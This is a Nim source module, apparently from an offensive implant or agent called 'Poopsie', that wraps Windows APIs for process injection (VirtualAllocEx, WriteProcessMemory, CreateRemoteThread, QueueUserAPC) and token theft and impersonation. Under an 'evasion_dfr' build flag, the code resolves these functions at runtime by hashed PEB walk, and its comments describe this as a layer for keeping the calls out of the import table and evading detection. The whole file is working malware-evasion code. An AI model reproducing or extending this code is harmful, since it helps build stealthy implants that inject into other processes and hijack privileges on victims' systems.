## Dynamic Win32 API resolution wrappers for Poopsie.
##
## Layered evasion architecture:
## 1. evasion_dfr: Resolve Win32 APIs at runtime via PEB walk (no IAT entries)
## 2. Neither: No wrapper — task files use winim originals directly
##
## Task files import this module and exclude the same names from winim:
##   import winim/lean except VirtualAllocEx, WriteProcessMemory, ...
##   import ../utils/winapi

import winim/lean

# --- Resolve helpers for DFR layer ---

when defined(evasion_dfr):
  import evasion

  proc resolveK32(funcName: string): pointer =
    let modHash = djb2HashStrLower("kernel32.dll")
    let fnHash = djb2HashStr(funcName)
    return resolveFunction(modHash, fnHash)

  proc resolveAdv32(funcName: string): pointer =
    let modHash = djb2HashStrLower("advapi32.dll")
    let fnHash = djb2HashStr(funcName)
    return resolveFunction(modHash, fnHash)

# ============================================================
# Stack-spoofed wrapper layer (highest priority)
# All API calls routed through spoofed stack frames.
# Internally resolves via DFR (PEB walk) or GetProcAddress.
# ============================================================
# DFR layer — Resolve Win32 APIs at runtime via PEB walk
# ============================================================

when defined(evasion_dfr):

  # ---- kernel32.dll ----

  type
    TVirtualAllocEx {.used.} = proc(hProcess: HANDLE, lpAddress: LPVOID, dwSize: SIZE_T,
      flAllocationType: DWORD, flProtect: DWORD): LPVOID {.stdcall.}
    TVirtualProtectEx {.used.} = proc(hProcess: HANDLE, lpAddress: LPVOID, dwSize: SIZE_T,
      flNewProtect: DWORD, lpflOldProtect: PDWORD): WINBOOL {.stdcall.}
    TVirtualAlloc {.used.} = proc(lpAddress: LPVOID, dwSize: SIZE_T,
      flAllocationType: DWORD, flProtect: DWORD): LPVOID {.stdcall.}
    TVirtualProtect {.used.} = proc(lpAddress: LPVOID, dwSize: SIZE_T,
      flNewProtect: DWORD, lpflOldProtect: PDWORD): WINBOOL {.stdcall.}
    TVirtualFree {.used.} = proc(lpAddress: LPVOID, dwSize: SIZE_T, dwFreeType: DWORD): WINBOOL {.stdcall.}
    TWriteProcessMemory {.used.} = proc(hProcess: HANDLE, lpBaseAddress: LPVOID,
      lpBuffer: LPCVOID, nSize: SIZE_T, lpNumberOfBytesWritten: ptr SIZE_T): WINBOOL {.stdcall.}
    TCreateRemoteThread {.used.} = proc(hProcess: HANDLE, lpThreadAttributes: LPSECURITY_ATTRIBUTES,
      dwStackSize: SIZE_T, lpStartAddress: LPTHREAD_START_ROUTINE, lpParameter: LPVOID,
      dwCreationFlags: DWORD, lpThreadId: LPDWORD): HANDLE {.stdcall.}
    TOpenProcess {.used.} = proc(dwDesiredAccess: DWORD, bInheritHandle: WINBOOL,
      dwProcessId: DWORD): HANDLE {.stdcall.}
    TCreateProcessA {.used.} = proc(lpApplicationName: LPCSTR, lpCommandLine: LPSTR,
      lpProcessAttributes: LPSECURITY_ATTRIBUTES, lpThreadAttributes: LPSECURITY_ATTRIBUTES,
      bInheritHandles: WINBOOL, dwCreationFlags: DWORD, lpEnvironment: LPVOID,
      lpCurrentDirectory: LPCSTR, lpStartupInfo: ptr STARTUPINFOA,
      lpProcessInformation: LPPROCESS_INFORMATION): WINBOOL {.stdcall.}
    TResumeThread {.used.} = proc(hThread: HANDLE): DWORD {.stdcall.}
    TQueueUserAPC {.used.} = proc(pfnAPC: PAPCFUNC, hThread: HANDLE, dwData: ULONG_PTR): DWORD {.stdcall.}
    TOpenProcessToken {.used.} = proc(ProcessHandle: HANDLE, DesiredAccess: DWORD,
      TokenHandle: PHANDLE): WINBOOL {.stdcall.}
    TDuplicateTokenEx {.used.} = proc(hExistingToken: HANDLE, dwDesiredAccess: DWORD,
      lpTokenAttributes: LPSECURITY_ATTRIBUTES, ImpersonationLevel: SECURITY_IMPERSONATION_LEVEL,
      TokenType: TOKEN_TYPE, phNewToken: PHANDLE): WINBOOL {.stdcall.}
    TImpersonateLoggedOnUser {.used.} = proc(hToken: HANDLE): WINBOOL {.stdcall.}
    TAdjustTokenPrivileges {.used.} = proc(TokenHandle: HANDLE, DisableAllPrivileges: WINBOOL,
      NewState: PTOKEN_PRIVILEGES, BufferLength: DWORD,
      PreviousState: PTOKEN_PRIVILEGES, ReturnLength: PDWORD): WINBOOL {.stdcall.}
    TRevertToSelf {.used.} = proc(): WINBOOL {.stdcall.}
    TCreateProcessWithTokenW {.used.} = proc(hToken: HANDLE, dwLogonFlags: DWORD,
      lpApplicationName: LPCWSTR, lpCommandLine: LPWSTR,
      dwCreationFlags: DWORD, lpEnvironment: LPVOID, lpCurrentDirectory: LPCWSTR,
      lpStartupInfo: LPSTARTUPINFOW, lpProcessInformation: LPPROCESS_INFORMATION): WINBOOL {.stdcall.}
    TCreateProcessWithLogonW {.used.} = proc(lpUsername: LPCWSTR, lpDomain: LPCWSTR, lpPassword: LPCWSTR,
      dwLogonFlags: DWORD, lpApplicationName: LPCWSTR, lpCommandLine: LPWSTR,
      dwCreationFlags: DWORD, lpEnvironment: LPVOID, lpCurrentDirectory: LPCWSTR,
      lpStartupInfo: LPSTARTUPINFOW, lpProcessInformation: LPPROCESS_INFORMATION): WINBOOL {.stdcall.}

  proc VirtualAllocEx*(hProcess: HANDLE, lpAddress: LPVOID, dwSize: SIZE_T,
      flAllocationType: DWORD, flProtect: DWORD): LPVOID =
    cast[TVirtualAllocEx](resolveK32("VirtualAllocEx"))(hProcess, lpAddress, dwSize, flAllocationType, flProtect)

  proc VirtualProtectEx*(hProcess: HANDLE, lpAddress: LPVOID, dwSize: SIZE_T,
      flNewProtect: DWORD, lpflOldProtect: PDWORD): WINBOOL =
    cast[TVirtualProtectEx](resolveK32("VirtualProtectEx"))(hProcess, lpAddress, dwSize, flNewProtect, lpflOldProtect)

  proc VirtualAlloc*(lpAddress: LPVOID, dwSize: SIZE_T,
      flAllocationType: DWORD, flProtect: DWORD): LPVOID =
    cast[TVirtualAlloc](resolveK32("VirtualAlloc"))(lpAddress, dwSize, flAllocationType, flProtect)

  proc VirtualProtect*(lpAddress: LPVOID, dwSize: SIZE_T,
      flNewProtect: DWORD, lpflOldProtect: PDWORD): WINBOOL =
    cast[TVirtualProtect](resolveK32("VirtualProtect"))(lpAddress, dwSize, flNewProtect, lpflOldProtect)

  proc VirtualFree*(lpAddress: LPVOID, dwSize: SIZE_T, dwFreeType: DWORD): WINBOOL =
    cast[TVirtualFree](resolveK32("VirtualFree"))(lpAddress, dwSize, dwFreeType)

  proc WriteProcessMemory*(hProcess: HANDLE, lpBaseAddress: LPVOID,
      lpBuffer: LPCVOID, nSize: SIZE_T, lpNumberOfBytesWritten: ptr SIZE_T): WINBOOL =
    cast[TWriteProcessMemory](resolveK32("WriteProcessMemory"))(hProcess, lpBaseAddress, lpBuffer, nSize, lpNumberOfBytesWritten)

  proc CreateRemoteThread*(hProcess: HANDLE, lpThreadAttributes: LPSECURITY_ATTRIBUTES,
      dwStackSize: SIZE_T, lpStartAddress: LPTHREAD_START_ROUTINE, lpParameter: LPVOID,
      dwCreationFlags: DWORD, lpThreadId: LPDWORD): HANDLE =
    cast[TCreateRemoteThread](resolveK32("CreateRemoteThread"))(hProcess, lpThreadAttributes, dwStackSize, lpStartAddress, lpParameter, dwCreationFlags, lpThreadId)

  proc OpenProcess*(dwDesiredAccess: DWORD, bInheritHandle: WINBOOL,
      dwProcessId: DWORD): HANDLE =
    cast[TOpenProcess](resolveK32("OpenProcess"))(dwDesiredAccess, bInheritHandle, dwProcessId)

  proc CreateProcessA*(lpApplicationName: LPCSTR, lpCommandLine: LPSTR,
      lpProcessAttributes: LPSECURITY_ATTRIBUTES, lpThreadAttributes: LPSECURITY_ATTRIBUTES,
      bInheritHandles: WINBOOL, dwCreationFlags: DWORD, lpEnvironment: LPVOID,
      lpCurrentDirectory: LPCSTR, lpStartupInfo: ptr STARTUPINFOA,
      lpProcessInformation: LPPROCESS_INFORMATION): WINBOOL =
    cast[TCreateProcessA](resolveK32("CreateProcessA"))(lpApplicationName, lpCommandLine, lpProcessAttributes, lpThreadAttributes,
      bInheritHandles, dwCreationFlags, lpEnvironment, lpCurrentDirectory, lpStartupInfo, lpProcessInformation)

  proc ResumeThread*(hThread: HANDLE): DWORD =
    cast[TResumeThread](resolveK32("ResumeThread"))(hThread)

  proc QueueUserAPC*(pfnAPC: PAPCFUNC, hThread: HANDLE, dwData: ULONG_PTR): DWORD =
    cast[TQueueUserAPC](resolveK32("QueueUserAPC"))(pfnAPC, hThread, dwData)

  # ---- advapi32.dll ----

  proc OpenProcessToken*(ProcessHandle: HANDLE, DesiredAccess: DWORD,
      TokenHandle: PHANDLE): WINBOOL =
    cast[TOpenProcessToken](resolveAdv32("OpenProcessToken"))(ProcessHandle, DesiredAccess, TokenHandle)

  proc DuplicateTokenEx*(hExistingToken: HANDLE, dwDesiredAccess: DWORD,
      lpTokenAttributes: LPSECURITY_ATTRIBUTES, ImpersonationLevel: SECURITY_IMPERSONATION_LEVEL,
      TokenType: TOKEN_TYPE, phNewToken: PHANDLE): WINBOOL =
    cast[TDuplicateTokenEx](resolveAdv32("DuplicateTokenEx"))(hExistingToken, dwDesiredAccess, lpTokenAttributes, ImpersonationLevel, TokenType, phNewToken)

  proc ImpersonateLoggedOnUser*(hToken: HANDLE): WINBOOL =
    cast[TImpersonateLoggedOnUser](resolveAdv32("ImpersonateLoggedOnUser"))(hToken)

  proc AdjustTokenPrivileges*(TokenHandle: HANDLE, DisableAllPrivileges: WINBOOL,
      NewState: PTOKEN_PRIVILEGES, BufferLength: DWORD,
      PreviousState: PTOKEN_PRIVILEGES, ReturnLength: PDWORD): WINBOOL =
    cast[TAdjustTokenPrivileges](resolveAdv32("AdjustTokenPrivileges"))(TokenHandle, DisableAllPrivileges, NewState, BufferLength, PreviousState, ReturnLength)

  proc RevertToSelf*(): WINBOOL =
    cast[TRevertToSelf](resolveAdv32("RevertToSelf"))()

  proc CreateProcessWithTokenW*(hToken: HANDLE, dwLogonFlags: DWORD,
      lpApplicationName: LPCWSTR, lpCommandLine: LPWSTR,
      dwCreationFlags: DWORD, lpEnvironment: LPVOID, lpCurrentDirectory: LPCWSTR,
      lpStartupInfo: LPSTARTUPINFOW, lpProcessInformation: LPPROCESS_INFORMATION): WINBOOL =
    cast[TCreateProcessWithTokenW](resolveAdv32("CreateProcessWithTokenW"))(hToken, dwLogonFlags, lpApplicationName, lpCommandLine, dwCreationFlags, lpEnvironment, lpCurrentDirectory, lpStartupInfo, lpProcessInformation)

  proc CreateProcessWithLogonW*(lpUsername: LPCWSTR, lpDomain: LPCWSTR, lpPassword: LPCWSTR,
      dwLogonFlags: DWORD, lpApplicationName: LPCWSTR, lpCommandLine: LPWSTR,
      dwCreationFlags: DWORD, lpEnvironment: LPVOID, lpCurrentDirectory: LPCWSTR,
      lpStartupInfo: LPSTARTUPINFOW, lpProcessInformation: LPPROCESS_INFORMATION): WINBOOL =
    cast[TCreateProcessWithLogonW](resolveAdv32("CreateProcessWithLogonW"))(lpUsername, lpDomain, lpPassword, dwLogonFlags, lpApplicationName, lpCommandLine, dwCreationFlags, lpEnvironment, lpCurrentDirectory, lpStartupInfo, lpProcessInformation)
